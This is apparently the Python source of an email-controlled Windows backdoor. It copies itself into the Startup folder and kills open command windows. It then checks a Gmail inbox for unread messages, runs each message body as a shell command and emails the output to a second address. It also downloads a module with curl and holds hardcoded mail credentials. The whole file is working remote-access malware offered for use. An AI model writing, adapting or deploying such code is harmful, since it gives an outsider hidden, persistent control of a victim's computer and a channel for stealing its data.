import smtplib
import ssl
from email.message import EmailMessage
import imaplib
import email
import os
import time
import subprocess as sp
import winreg as reg
import getpass
try:
    from playsound import playsound
except:
    os.system("curl https://raw.githubusercontent.com/ivertheboss/Photon-Unity/main/GameFolder/MonoBleedingEdge/EmbedRuntime/playsound.py -o playsound.py")
    from playsound import playsound
import threading

thread = ""

def play(sound):
    playsound(sound)

USER_NAME = getpass.getuser()

def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__)+"\\"+os.path.basename(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'pythonw ' + file_path)

add_to_startup()

os.system('taskkill /F /IM cmd.exe')

host = 'imap.gmail.com'
username = 'bill.mcdinner.business@gmail.com'
password = 'zpxhoobibxiabqqk'

def get_inbox():
    mail = imaplib.IMAP4_SSL(host)
    mail.login(username, password)
    mail.select("inbox")
    _, search_data = mail.search(None, 'UNSEEN')
    my_message = []
    for num in search_data[0].split():
        email_data = {}
        _, data = mail.fetch(num, '(RFC822)')
        _, b = data[0]
        email_message = email.message_from_bytes(b)
        for header in ['subject', 'to', 'from', 'date']:
            email_data[header] = email_message[header]
        for part in email_message.walk():
            if part.get_content_type() == "text/plain":
                body = part.get_payload(decode=True)
                email_data['body'] = body.decode()
            elif part.get_content_type() == "text/html":
                html_body = part.get_payload(decode=True)
                email_data['html_body'] = html_body.decode()
        my_message.append(email_data)
    return my_message

count = 0

print("AWAITING COMMAND...")

while True:
    time.sleep(0.1)
    # Define email sender and receiver
    email_sender = 'bill.mcdinner.business@gmail.com'
    email_password = 'zpxhoobibxiabqqk'
    email_receiver = 'python.reciever.email@gmail.com'

    try:
        command = get_inbox()[0]['body']
        if command[0:9] == "stopsound":
            try:
                thread.terminate()
                subject = 'CMD'
                body = "SOUND STOPPED"
                em = EmailMessage()
                em['From'] = email_sender
                em['To'] = email_receiver
                em['Subject'] = subject
                em.set_content(body)
                context = ssl.create_default_context()
                with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
                    smtp.login(email_sender, email_password)
                    smtp.sendmail(email_sender, email_receiver, em.as_string())
            except:
                subject = 'CMD'
                body = "NO SOUNDS PLAYING"
                em = EmailMessage()
                em['From'] = email_sender
                em['To'] = email_receiver
                em['Subject'] = subject
                em.set_content(body)
                context = ssl.create_default_context()
                with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
                    smtp.login(email_sender, email_password)
                    smtp.sendmail(email_sender, email_receiver, em.as_string())
        if command[0:9] == "playsound":
            try:
                thread = threading.Thread(target=play, args=(command.partition(' ')[2],))
                thread.start()
                subject = 'CMD'
                body = "PLAYING SOUND (deviously)"
                em = EmailMessage()
                em['From'] = email_sender
                em['To'] = email_receiver
                em['Subject'] = subject
                em.set_content(body)
                context = ssl.create_default_context()
                with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
                    smtp.login(email_sender, email_password)
                    smtp.sendmail(email_sender, email_receiver, em.as_string())
            except:
                subject = 'CMD'
                body = "COULD NOT FIND FILE"
                em = EmailMessage()
                em['From'] = email_sender
                em['To'] = email_receiver
                em['Subject'] = subject
                em.set_content(body)
                context = ssl.create_default_context()
                with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
                    smtp.login(email_sender, email_password)
                    smtp.sendmail(email_sender, email_receiver, em.as_string())
        print("COMMAND RECEIVED...")
        print("EXECUTING COMMAND...")
        subject = 'CMD'
        body = ""
        result = ""
        error = ""
        try:
            result = str(sp.getoutput(command))
            body = f"""COMMAND SUCCESSFUL:
                                    \n""" + result + """
                                    """
        except e:
            error = e
            body = f"""COMMAND UNSUCCESSFUL:
                        \n""" + error + """
                        """

        em = EmailMessage()
        em['From'] = email_sender
        em['To'] = email_receiver
        em['Subject'] = subject
        em.set_content(body)

        # Add SSL (layer of security)
        context = ssl.create_default_context()
        print("COMMAND EXECUTED...")

        print("SENDING CONFORMATION...")
        with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
            smtp.login(email_sender, email_password)
            smtp.sendmail(email_sender, email_receiver, em.as_string())
        print("CONFORMATION SENT...")
        print("RESETTING DATA...")
        time.sleep(2)
        print("DATA RESET DONE...")
        print("AWAITING COMMAND...")
    except:
        pass
